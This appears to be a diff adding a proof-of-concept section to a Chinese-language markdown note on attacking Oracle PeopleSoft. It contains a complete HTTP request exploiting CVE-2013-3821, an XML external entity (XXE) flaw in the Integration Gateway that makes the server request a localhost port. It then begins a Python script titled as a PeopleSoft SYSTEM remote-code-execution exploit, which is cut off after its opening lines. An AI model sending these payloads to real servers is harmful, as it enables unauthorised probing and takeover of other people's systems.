@@ -22,6 +22,48 @@
 - 找到site name/ID: `/`，匹配其结果`<a href="../ps/signon.html">`，这里就是`ps`
 
 ### PoC
+
+
+#### [CVE-2013-3821]  Integration Gateway HttpListeningConnector XXE
+```http
+POST /PSIGW/HttpListeningConnector HTTP/1.1
+Host: website.com
+Content-Type: application/xml
+...
+
+<?xml version="1.0"?>
+<!DOCTYPE IBRequest [
+<!ENTITY x SYSTEM "http://localhost:51420">
+]>
+<IBRequest>
+   <ExternalOperationName>&x;</ExternalOperationName>
+   <OperationType/>
+   <From><RequestingNode/>
+      <Password/>
+      <OrigUser/>
+      <OrigNode/>
+      <OrigProcess/>
+      <OrigTimeStamp/>
+   </From>
+   <To>
+      <FinalDestination/>
+      <DestinationNode/>
+      <SubChannel/>
+   </To>
+   <ContentSections>
+      <ContentSection>
+         <NonRepudiation/>
+         <MessageVersion/>
+         <Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
+         </Data>
+      </ContentSection>
+   </ContentSections>
+</IBRequest>
+```
+
+#### 
+
+#### 完整exploit
 ```py
 #!/usr/bin/python3
 # Oracle PeopleSoft SYSTEM RCE
